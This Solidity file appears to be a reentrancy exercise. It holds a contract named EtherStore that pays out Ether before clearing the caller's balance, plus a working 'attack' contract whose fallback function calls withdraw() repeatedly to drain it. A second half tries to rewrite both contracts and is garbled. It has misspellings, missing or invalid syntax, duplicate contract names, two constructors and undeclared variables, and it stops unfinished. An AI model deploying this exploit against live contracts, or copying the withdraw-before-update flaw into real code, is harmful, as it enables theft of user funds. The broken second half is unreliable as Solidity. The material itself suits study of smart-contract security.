// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract attack {

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }


    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attacks() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}

contract test{ 

    mapping(address => uint) balances;

    function deposit(uint value) public payable {
        balances[msg.sender] += value;
    }

    function getBalance() pblic returns(uint){
        return address(this).balance;
    }

    function withdraw() public {
       uint bal = balances[msg.sender];

       require(bal > 0, "err")

       (bool sent;) = msg.sender.call{value: ''}("");
       balances[msg.sender] = 0;

    }
}


contract attack {

    Test public test;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
    
    constructor(address _contractaddress) {
        test = Test[_contractaddress];
    }
